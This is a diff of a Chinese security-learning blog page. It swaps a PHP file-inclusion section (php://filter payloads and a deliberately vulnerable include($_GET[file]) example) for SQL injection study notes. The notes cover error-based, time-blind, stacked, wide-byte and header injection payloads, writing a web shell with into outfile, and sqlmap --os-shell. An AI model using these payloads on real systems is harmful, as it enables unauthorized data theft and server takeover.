-<li><p>介绍<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数很是有用，相似 <code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>， 在数据流内容读取以前没有机会应用其余过滤器。</p>
-<p><code>php://filter</code>目标使用如下的参数做为它路径的一部分。 复合过滤链可以在一个路径上指定。详细使用这些参数能够参考具体范例。<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203954389.png" alt="image-20210208203954389"></p>
+<li><p>updatexml报错获取当前数据库：</p>
+<pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>floor报错获取当前数据库：</p>
+<pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>两种方式应该都可行，如果第一个不行就换第二个试试</p>
 </li>
-<li><p>使用条件</p>
-<ol>
-<li>allow_url_include = Off/On #无要求</li>
+<li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p>
+</li>
+<li><p>注意这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p>
+</li>
 </ol>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ol>
+<li><p>没有明确的现象，不管是对是错都返回一个状态；</p>
 </li>
-<li><p>范例</p>
-<p>环境：</p>
-<pre class="line-numbers language-none"><code class="language-none">//filter.php
-&lt;?php
-include($_GET[file]);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>应用：</p>
-<pre class="line-numbers language-none"><code class="language-none">//payload
-[GAT DATA 1]:    filter.php?file=php://filter/read=convert.base64-encode/resource=filter.php  
-[GET DATA 2]:    filter.php?file=php://filter/convert.base64-encode/resource=filter.php  
-[GAT DATA 3]:    filter.php?file=php://filter/resource=php://input    [POST DATA]:    &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3></li>
-</ul>
-<p>简介<br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，而且对于应用程序中的全部页面都是可用的。在您把用户信息存储到 PHP session 中以前，首先必须使用<code>session_start()</code>启动会话。<br>php的session文件的保存路径能够再phpinfo的session.save_path查询到<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203749051.png" alt="image-20210208203749051"><br>常见的php-session存放位置：</p>
-<pre class="line-numbers language-none"><code class="language-none">/var/lib/php/sess_PHPSESSID
-/var/lib/php/sess_PHPSESSID
-/tmp/sess_PHPSESSID
-/tmp/sessions/sess_PHPSESSID  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中能够看到。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p>最近在复习，自己php的题目做的还比较少，只实践了部分php漏洞。</p>
-<p>在整理漏洞的过程中发现一些漏洞对于我来说是非常陌生的，在整理的过程中也拓宽了自己的视野。</p>
-<p>最近php8也发布了，一些漏洞说不定已经过时，又会出现新的漏洞。只有不断的学习才能适应这个快速发展的时代！</p>
+<li><p>但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；</p>
+</li>
+<li><p>我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；</p>
+</li>
+<li><p>同样的找到正确的闭合规则，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；</p>
+</li>
+<li><p>时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；</p>
+</li>
+<li><p>那么判断当前数据库名的长度的语句为：</p>
+<pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是没有延时)，由此来推出数据库长度。</p>
+</li>
+<li><p>判断当前数据库名的第一个和第二个字母的语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p>
+</li>
+<li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p>
+</li>
+</ol>
+<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><ol>
+<li><p>可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；</p>
+</li>
+<li><p>同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；</p>
+</li>
+<li><p>堆叠注入的语句为</p>
+<pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1)
+;select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p>
+</li>
+</ol>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><ol>
+<li>二次注入一共有两个url，一个url用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</li>
+<li>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</li>
+<li>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</li>
+<li>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</li>
+<li>后面就是union注入攻击的常规操作。</li>
+</ol>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><ol>
+<li>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</li>
+<li>一般情况下，此处就不存在sql注入漏洞的；</li>
+<li>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</li>
+<li>宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</li>
+<li>因此构造闭合规则时，在单引号前面加上 %df 就行了；</li>
+<li>之后在闭合规则中写入同union注入的一些查询语句就行了；</li>
+</ol>
+<h4 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h4><p>首先base64是什么?</p>
+<p>Base64是网络上最常见的用于传输8Bit<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457">二进制</a>数据的方法。Base64编码是从二进制到字符的过程，可用于在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/HTTP">HTTP</a>环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p>
+<ol>
+<li>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</li>
+<li>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</li>
+<li>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</li>
+</ol>
+<h4 id="http请求头—cooki注入"><a href="#http请求头—cooki注入" class="headerlink" title="http请求头—cooki注入"></a>http请求头—cooki注入</h4><ol>
+<li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p>
+</li>
+<li><p>常见的http头部注入的参数有：</p>
+<pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p>
+</li>
+<li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
+</li>
+</ol>
+<h4 id="http请求头—XFF注入"><a href="#http请求头—XFF注入" class="headerlink" title="http请求头—XFF注入"></a>http请求头—XFF注入</h4><ol>
+<li>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</li>
+<li>例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；</li>
+<li>之后使用union注入的方法完成即可。</li>
+</ol>
+<h4 id="知道绝对路径的注入"><a href="#知道绝对路径的注入" class="headerlink" title="知道绝对路径的注入"></a>知道绝对路径的注入</h4><ol>
+<li>如果知道了网站的根目录，并且知道此站点存在sql注入；</li>
+<li>猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用蚁剑连接；</li>
+<li>如果数据库没有file权限，就用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；</li>
+<li>如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；</li>
+<li>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</li>
+</ol>
+<h3 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h3><p>sqlmap支持一下五种注入：</p>
+<ol>
+<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>联合查询注入，可以使用union的情况下的注入。</li>
+<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ol>
+<p>下面有简要的操作概述</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201453846.png" alt="image-20210208201453846"></p>
+<p>命令太多了，还不太熟练，目前只会用一点</p>
+<p>一些基本命令</p>
+<h4 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1.输出等级 V"></a>1.输出等级 V</h4><p><code>V</code> 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p>
+<p>默认是 1，也可以在命令后指定 <code>-v 3</code> 就是等级 3 的输出。</p>
+<pre class="line-numbers language-none"><code class="language-none">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；
+1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；
+2：同时显示调试信息 [DEBUG]；
+3：同时显示注入使用的攻击荷载；
+4：同时显示 HTTP 请求；
+5：同时显示 HTTP 响应头；
+6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"
+sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p>
+<h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p>
+<h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201601814.png" alt="image-20210208201601814"></p>
+<p>这些只是一些枚举常用的，更多用法慢慢解锁吧</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉对于一些注入了解的还是不够深，有时候碰到新题自己试了各种方法总是要很久才做的出来。</p>
+<p>也可能是我数据库学的不怎么样，如果对数据库越熟悉的话做题起来应该会如鱼得水。</p>
+<p>自己目前也只是学了一个mysql，打算有空看看其他的数据库。</p>
+<p>其次sqlmap也还是用的不熟练，还是需要多去刷题多练练啊。</p>
 
                 
             </div>
@@ -640,7 +621,7 @@ include($_GET[file]);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://anwar211.top/2020/11/26/php-chang-jian-lou-dong/">https://anwar211.top/2020/11/26/php-chang-jian-lou-dong/</a>
+                    <a href="https://anwar211.top/2020/11/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/">https://anwar211.top/2020/11/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -726,12 +707,12 @@ include($_GET[file]);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/11/28/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/">
+                <a href="/2020/11/ba-chang-xue-xi/upload-labs/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用">
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205421280.png" class="responsive-img" alt="upload-labs">
                         
-                        <span class="card-title">sql注入原理及sqlmap的使用</span>
+                        <span class="card-title">upload-labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -742,7 +723,7 @@ include($_GET[file]);
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-28
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-29
                         </span>
                         <span class="publish-author">
                             
@@ -774,12 +755,13 @@ include($_GET[file]);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/11/zheng-ze-biao-da-shi-xue-xi/">
+                <a href="/2020/11/chang-jian-lou-dong/php-chang-jian-lou-dong/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208210010451.png" class="responsive-img" alt="正则表达式学习">
                         
-                        <span class="card-title">正则表达式学习</span>
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="php常见漏洞">
+                        
+                        <span class="card-title">php常见漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -790,7 +772,7 @@ include($_GET[file]);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-26
                             </span>
                         <span class="publish-author">
                             
